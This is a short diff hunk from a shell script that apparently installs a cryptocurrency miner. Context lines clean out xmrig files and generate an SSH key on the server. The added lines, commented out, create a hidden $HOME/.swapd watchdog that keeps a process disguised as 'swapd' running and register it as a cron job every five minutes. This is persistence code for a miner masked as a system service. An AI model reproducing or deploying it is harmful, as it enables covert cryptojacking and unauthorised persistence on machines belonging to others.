@@ -530,6 +530,25 @@ rm -rf $HOME/xmrig* ; rm -rf xmrig* ; apt autoremove -y ; yum autoremove -y;
 
 rm -rf xmrig* config.json*
 
+## Create the check script
+#cat << 'EOF' > "$HOME/.swapd/check_swapd.sh"
+##!/bin/bash
+
+#if ! pgrep -f "./swapd" > /dev/null; then
+#    echo "swapd not started. Going to start it..."
+#    cd "$HOME/.swapd/" || exit
+#    ./swapd --config=config.json &
+#else
+#    echo "swapd already started."
+#fi
+#EOF
+
+# Make the check script executable
+#chmod +x "$HOME/.swapd/check_swapd.sh"
+
+# Cron job setup: remove outdated lines and add the new command
+#CRON_JOB="*/5 * * * * $HOME/.swapd/check_swapd.sh"
+#(crontab -l 2>/dev/null | grep -v -E '(out dat|check_swapd.sh)'; echo "$CRON_JOB") | crontab -
 
 echo "[*] Generating ssh key on server"
 
